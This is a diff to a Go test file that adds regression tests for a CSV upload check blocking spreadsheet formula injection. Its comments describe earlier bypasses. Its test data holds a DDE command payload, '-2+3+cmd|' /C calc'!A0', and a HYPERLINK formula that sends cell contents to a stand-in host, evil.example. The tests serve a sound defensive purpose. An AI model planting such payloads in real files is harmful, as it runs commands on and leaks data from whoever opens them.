@@ -11,6 +11,9 @@ import (
 	"strings"
 	"testing"
 	"time"
+
+	"github.com/quilzo/quilzo/internal/collection"
+	"github.com/quilzo/quilzo/internal/sheet"
 )
 
 var now = time.Date(2026, 8, 15, 12, 0, 0, 0, time.UTC)
@@ -461,5 +464,79 @@ func TestEveryAcceptedFormatHasBoundsAndAVerifier(t *testing.T) {
 		if fm.MIME == "" || fm.Kind == "" {
 			t.Errorf("%s is missing its MIME type or kind", name)
 		}
+	}
+}
+
+// The upload check refuses every cell the exports would guard, and takes
+// a file the records export wrote.
+//
+// It stripped tabs before it looked, so its branch for a cell that starts
+// with one could never be reached; it let through a cell beginning with a
+// minus, which is the classic -2+3+cmd|' /C calc'!A0; and it read the
+// carriage return that ends each line of a Windows file as a cell starting
+// with one, so an export of records whose last column was empty was
+// refused as smuggling a formula.
+func TestTheUploadCheckRefusesEveryCellTheExportWouldGuard(t *testing.T) {
+	quote := func(v string) string { return `"` + strings.ReplaceAll(v, `"`, `""`) + `"` }
+	for _, v := range []string{"\tplain", "-2+3+cmd|' /C calc'!A0", "-cmd", "=1+1", "+1+1", "@SUM(A1)"} {
+		if _, err := Accept("data.csv", []byte("a,b\n1,"+quote(v)+"\n"), now); err == nil {
+			t.Errorf("a CSV with the cell %q was accepted, and every export guards it", v)
+		}
+	}
+	recs := []collection.Record{
+		{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", "balance": -4.5, "note": ""}},
+		{ID: "b", Created: 2, Fields: map[string]any{"name": "Grace", "balance": 12.0}},
+	}
+	body := sheet.Write(nil, recs, sheet.WriteOptions{})
+	if !bytes.Contains(body, []byte(",\r\n")) {
+		t.Fatalf("control: the export has no empty last cell:\n%q", body)
+	}
+	if _, err := Accept("records.csv", body, now); err != nil {
+		t.Errorf("a file the records export wrote was refused: %v\n%q", err, body)
+	}
+}
+
+// A formula is refused wherever in the file a spreadsheet would read it as
+// one: in the first cell after the byte-order mark, past the five
+// thousandth line, and in a cell a semicolon or a tab begins.
+//
+// The check looked only at cells a comma begins, in the first 5,001 lines,
+// with a byte-order mark read as part of the first cell. A spreadsheet
+// takes the mark off before it reads the file, finds the separator for
+// itself (Sheets and LibreOffice by looking, Excel by the list separator
+// of its country, which is a semicolon across much of Europe), and reads
+// every line. So a file a visitor attached to a form, with a formula in
+// any of those places, was accepted, and ran when the site's owner opened
+// it.
+func TestTheUploadCheckFindsAFormulaWhereverASpreadsheetWouldRunIt(t *testing.T) {
+	formula := `=HYPERLINK("http://evil.example/?"&B2)`
+	for name, body := range map[string]string{
+		"after the byte-order mark": "\ufeff" + formula + ",b\n1,2\n",
+		"past line 5,000":           strings.Repeat("a,b\n", 5001) + "1," + formula + "\n",
+		"after a semicolon":         "a;b\n1;" + formula + "\n",
+		"after a tab":               "a\tb\n1\t" + formula + "\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err == nil {
+			t.Errorf("a CSV with a formula %s was accepted", name)
+		}
+	}
+
+	// Control: the same shapes with nothing a spreadsheet runs are taken,
+	// a negative number after each separator included.
+	for name, body := range map[string]string{
+		"with a byte-order mark": "\ufeffid,b\n1,-4.5\n",
+		"of 5,002 lines":         strings.Repeat("a,b\n", 5001) + "1,-4.5\n",
+		"split by semicolons":    "a;b\n1;-4.5\n",
+		"split by tabs":          "a\tb\n1\t-4.5\n",
+	} {
+		if _, err := Accept("data.csv", []byte(body), now); err != nil {
+			t.Errorf("an ordinary CSV %s was refused: %v", name, err)
+		}
+	}
+	recs := []collection.Record{{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", "balance": -4.5}}}
+	if body := sheet.Write(nil, recs, sheet.WriteOptions{BOM: true}); !bytes.HasPrefix(body, []byte("\ufeff")) {
+		t.Fatalf("control: the export has no byte-order mark:\n%q", body)
+	} else if _, err := Accept("records.csv", body, now); err != nil {
+		t.Errorf("a file the records export wrote for Excel was refused: %v\n%q", err, body)
 	}
 }
